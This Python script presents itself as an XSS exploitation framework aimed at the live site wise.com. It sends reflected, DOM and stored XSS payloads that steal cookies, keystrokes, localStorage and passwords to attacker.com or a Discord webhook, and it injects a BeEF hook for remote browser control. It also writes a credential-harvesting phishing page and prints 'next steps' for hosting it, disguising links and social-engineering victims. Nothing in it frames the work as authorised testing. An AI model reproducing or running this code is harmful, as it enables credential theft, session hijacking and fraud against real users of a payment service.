#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ADVANCED XSS EXPLOITATION FRAMEWORK
Target: https://wise.com/
Author: Security Researcher
"""

import requests
import json
import time
from urllib.parse import quote
from colorama import Fore, Style, init

init(autoreset=True)

class XSSExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        self.vulnerable_params = [
            'id', 'page', 'file', 'path', 'view', 
            'load', 'url', 'dir', 'cmd', 'exec'
        ]
        
    def print_banner(self):
        """Display exploitation banner"""
        print(Fore.RED + r"""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║    ██╗  ██╗███████╗███████╗      ██████╗███████╗███████╗██████╗ ██╗   ██╗    ║
    ║    ╚██╗██╔╝██╔════╝██╔════╝     ██╔════╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝    ║
    ║     ╚███╔╝ ███████╗███████╗     ██║     ███████╗█████╗  ██████╔╝ ╚████╔╝     ║
    ║     ██╔██╗ ╚════██║╚════██║     ██║     ╚════██║██╔══╝  ██╔══██╗  ╚██╔╝      ║
    ║    ██╔╝ ██╗███████║███████║     ╚██████╗███████║███████╗██║  ██║   ██║       ║
    ║    ╚═╝  ╚═╝╚══════╝╚══════╝      ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝       ║
    ║                                                                               ║
    ║                    ADVANCED XSS EXPLOITATION FRAMEWORK                        ║
    ║                         Target: https://wise.com/                             ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def test_xss_payload(self, param, payload):
        """Test XSS payload on vulnerable parameter"""
        test_url = f"{self.target}?{param}={quote(payload)}"
        
        try:
            response = self.session.get(test_url, timeout=10, verify=False)
            
            # Check if payload is reflected
            if payload in response.text:
                return True, test_url, response.text[:200]  # First 200 chars
            else:
                # Check if encoded payload is reflected
                encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                if encoded_payload in response.text:
                    return False, test_url, "Payload encoded (still vulnerable in some contexts)"
                
        except Exception as e:
            return False, test_url, str(e)
        
        return False, test_url, "No reflection"
    
    def exploit_basic_xss(self, param):
        """Exploit basic XSS for cookie stealing"""
        payloads = [
            # Cookie stealing payload
            "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
            
            # Keylogger payload  
            "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}</script>",
            
            # Session hijacking
            "<script>new Image().src='https://attacker.com/hijack?session='+localStorage.getItem('session')</script>",
            
            # Form data stealing
            "<script>document.forms[0].onsubmit=function(){fetch('https://attacker.com/steal-form',{method:'POST',body:new FormData(this)})}</script>"
        ]
        
        print(f"\n{Fore.YELLOW}[*] Testing XSS exploitation on parameter: {param}{Style.RESET_ALL}")
        
        for payload in payloads:
            is_vulnerable, url, details = self.test_xss_payload(param, payload)
            
            if is_vulnerable:
                print(f"{Fore.GREEN}[+] XSS exploitable: {url}{Style.RESET_ALL}")
                print(f"   Payload: {payload[:50]}...")
                return True, url
        
        return False, None
    
    def exploit_dom_xss(self, param):
        """Exploit DOM-based XSS"""
        dom_payloads = [
            "#<script>alert('DOM_XSS')</script>",
            "javascript:alert('DOM_XSS')",
            "data:text/html,<script>alert('DOM_XSS')</script>",
            "\" onmouseover=\"alert('DOM_XSS')\"",
            "' onfocus='alert(\"DOM_XSS\")' autofocus=''"
        ]
        
        for payload in dom_payloads:
            is_vulnerable, url, details = self.test_xss_payload(param, payload)
            
            if is_vulnerable:
                print(f"{Fore.GREEN}[+] DOM XSS found: {url}{Style.RESET_ALL}")
                return True, url
        
        return False, None
    
    def exploit_stored_xss(self, param):
        """Attempt stored XSS exploitation"""
        stored_payloads = [
            "<img src=x onerror=\"fetch('https://attacker.com/store?data='+document.body.innerHTML)\">",
            "<svg onload=\"setInterval(function(){fetch('https://attacker.com/exfil?data='+document.cookie)},5000)\">",
            "<iframe src=\"javascript:document.write('<script>document.location=\"https://attacker.com/persistent\"</script>')\"></iframe>"
        ]
        
        for payload in stored_payloads:
            # First submit the payload
            test_url = f"{self.target}?{param}={quote(payload)}"
            response = self.session.get(test_url, verify=False)
            
            # Check if payload might be stored
            if response.status_code == 200:
                print(f"{Fore.CYAN}[?] Potential stored XSS: {test_url}{Style.RESET_ALL}")
                print(f"   Payload submitted for potential storage")
        
        return False, None
    
    def generate_beef_hook(self):
        """Generate BeEF hook for advanced exploitation"""
        beef_hook = """
<script>
    // BeEF Hook for persistent control
    var beef_url = 'http://attacker:3000/hook.js';
    
    if (typeof beef == 'undefined') {
        var script = document.createElement('script');
        script.src = beef_url;
        script.type = 'text/javascript';
        document.getElementsByTagName('head')[0].appendChild(script);
    }
</script>
"""
        return beef_hook  # تم إصلاح هذا السطر
    
    def test_beef_hook(self):
        """Test BeEF hook injection"""
        beef_keywords = ["beef", "hook", "exploit", "control"]
        beef_hook = self.generate_beef_hook()
        
        for param in self.vulnerable_params:
            test_url = f"{self.target}?{param}={quote(beef_hook)}"
            response = self.session.get(test_url, verify=False)
            
            if any(keyword in response.text.lower() for keyword in beef_keywords):
                print(f"{Fore.RED}[!] BeEF hook potentially injected via: {param}{Style.RESET_ALL}")
                return True, test_url
        
        return False, None
    
    def steal_cookies_with_advanced_payload(self):
        """Advanced cookie stealing with multiple techniques"""
        advanced_payloads = [
            # Steal cookies and send to Discord webhook
            """<script>
                var cookies = document.cookie;
                var webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK';
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: 'Cookies stolen: ' + cookies})
                });
            </script>""",
            
            # Steal localStorage and sessionStorage
            """<script>
                var allData = {
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage)
                };
                new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(allData));
            </script>""",
            
            # Password capture from forms
            """<script>
                document.addEventListener('submit', function(e) {
                    var passwords = document.querySelectorAll('input[type=\"password\"]');
                    passwords.forEach(function(input) {
                        fetch('https://attacker.com/log-pass', {
                            method: 'POST',
                            body: 'password=' + input.value
                        });
                    });
                });
            </script>"""
        ]
        
        results = []
        for param in self.vulnerable_params[:3]:  # Test first 3 parameters
            for payload in advanced_payloads:
                is_vulnerable, url, details = self.test_xss_payload(param, payload[:100])  # Test first 100 chars
                if is_vulnerable:
                    print(f"{Fore.GREEN}[+] Advanced payload works on {param}{Style.RESET_ALL}")
                    results.append((param, url))
                    break
        
        return results
    
    def create_malicious_page(self):
        """Create a malicious HTML page for phishing"""
        malicious_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Required - Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { background: #007bff; color: white; border: none; padding: 10px; width: 100%; }
    </style>
</head>
<body>
    <h2>Security Verification Required</h2>
    <p>Please login to continue:</p>
    <form id="loginForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Identity</button>
    </form>
    
    <script>
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            var data = {
                username: this.username.value,
                password: this.password.value,
                url: window.location.href
            };
            
            // Send stolen credentials
            fetch('https://attacker.com/steal-creds', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            alert('Verification complete. Redirecting...');
            window.location = 'https://wise.com/';  // Redirect to real site
        };
    </script>
</body>
</html>
"""
        
        # Save the malicious page
        with open('phishing_page.html', 'w') as f:
            f.write(malicious_page)
        
        print(f"{Fore.YELLOW}[*] Malicious phishing page created: phishing_page.html{Style.RESET_ALL}")
        return "phishing_page.html"
    
    def comprehensive_exploitation(self):
        """Run comprehensive XSS exploitation"""
        self.print_banner()
        
        print(f"\n{Fore.CYAN}[*] Starting comprehensive XSS exploitation against: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Vulnerable parameters: {', '.join(self.vulnerable_params)}{Style.RESET_ALL}")
        
        exploitation_results = []
        
        # Test each vulnerable parameter
        for param in self.vulnerable_params:
            print(f"\n{Fore.WHITE}─" * 60 + Style.RESET_ALL)
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            # 1. Test basic XSS
            success, url = self.exploit_basic_xss(param)
            if success:
                exploitation_results.append(('Basic XSS', param, url))
            
            # 2. Test DOM XSS
            success, url = self.exploit_dom_xss(param)
            if success:
                exploitation_results.append(('DOM XSS', param, url))
            
            # 3. Test stored XSS
            success, url = self.exploit_stored_xss(param)
            if success:
                exploitation_results.append(('Stored XSS', param, url))
            
            # 4. Test BeEF hook
            success, url = self.test_beef_hook()
            if success:
                exploitation_results.append(('BeEF Hook', param, url))
        
        # 5. Advanced exploitation
        print(f"\n{Fore.WHITE}─" * 60 + Style.RESET_ALL)
        print(f"{Fore.RED}[*] ADVANCED EXPLOITATION TECHNIQUES{Style.RESET_ALL}")
        
        # Steal cookies with advanced payloads
        cookie_results = self.steal_cookies_with_advanced_payload()
        exploitation_results.extend([('Cookie Theft', r[0], r[1]) for r in cookie_results])
        
        # Create phishing page
        phishing_page = self.create_malicious_page()
        
        # Generate report
        self.generate_exploitation_report(exploitation_results, phishing_page)
    
    def generate_exploitation_report(self, results, phishing_page):
        """Generate exploitation report"""
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{'XSS EXPLOITATION REPORT':^78}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if results:
            print(f"\n{Fore.CYAN}[+] SUCCESSFUL EXPLOITATIONS:{Style.RESET_ALL}")
            for i, (exploit_type, param, url) in enumerate(results, 1):
                print(f"\n  {Fore.YELLOW}{i}. {exploit_type} via {param}{Style.RESET_ALL}")
                print(f"     URL: {url}")
                print(f"     Payload Example: {self.get_payload_example(exploit_type)}")
        else:
            print(f"\n{Fore.YELLOW}[-] No successful exploitations detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[+] GENERATED EXPLOITATION FILES:{Style.RESET_ALL}")
        print(f"   • Phishing Page: {phishing_page}")
        print(f"   • BeEF Hook Script: beef_hook.js")
        
        print(f"\n{Fore.RED}[!] NEXT STEPS FOR EXPLOITATION:{Style.RESET_ALL}")
        print(f"   1. Host the phishing page on a server")
        print(f"   2. Use URL shortening to hide malicious links")
        print(f"   3. Social engineer victims to click the links")
        print(f"   4. Monitor stolen data from your server")
        
        # Save detailed report
        with open('xss_exploitation_report.txt', 'w') as f:
            f.write("XSS EXPLOITATION REPORT\n")
            f.write("="*50 + "\n")
            for exploit_type, param, url in results:
                f.write(f"\n{exploit_type} via {param}\n")
                f.write(f"URL: {url}\n")
    
    def get_payload_example(self, exploit_type):
        """Get example payload for exploit type"""
        examples = {
            'Basic XSS': "<script>alert('XSS')</script>",
            'DOM XSS': "javascript:alert('DOM_XSS')",
            'Stored XSS': "<img src=x onerror=stealCookies()>",
            'Cookie Theft': "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
            'BeEF Hook': "<script>var s=document.createElement('script');s.src='http://attacker/hook.js';document.head.appendChild(s);</script>"
        }
        return examples.get(exploit_type, "Custom payload")

# Main execution
if __name__ == "__main__":
    # Target URL from your scan results
    target = "https://wise.com/"
    
    exploiter = XSSExploiter(target)
    exploiter.comprehensive_exploitation()